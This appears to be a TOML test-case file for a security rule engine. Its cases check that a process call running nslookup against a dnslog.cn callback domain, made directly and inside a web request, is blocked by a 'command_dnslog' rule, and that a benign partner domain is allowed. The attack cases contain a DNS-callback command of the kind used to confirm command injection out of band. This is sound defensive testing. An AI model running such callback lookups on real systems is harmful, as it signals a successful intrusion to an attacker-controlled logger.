[[case]]
name = "callback-domain-lookup"
kind = "attack"
via = "sink"
op = "process.exec"
args = { argv = ["/nonexistent/rule-case/nslookup", "abc123.dnslog.cn"] }
completes_with = ["IOException"]

[case.primary]
effect = "block"
rule = "command_dnslog"

[case.backport]
effect = "unreachable"
why = "the backports have no list of callback domains for process arguments"

[[case]]
name = "callback-domain-lookup-in-request"
kind = "attack"
via = "request-sink"
op = "process.exec"
args = { argv = ["/nonexistent/rule-case/nslookup", "abc123.dnslog.cn"] }
completes_with = ["IOException"]

[case.request]
method = "GET"
uri = "/app/report"
query = "id=7"
headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }

[case.primary]
effect = "block"
rule = "command_dnslog"

[case.backport]
effect = "unreachable"
why = "the backports have no list of callback domains for process arguments"

[[case]]
name = "benign-partner-domain"
kind = "benign"
via = "sink"
op = "process.exec"
args = { argv = ["/nonexistent/rule-case/nslookup", "reports.example.com"] }
completes_with = ["IOException"]

[case.primary]
effect = "none"

[case.backport]
effect = "none"
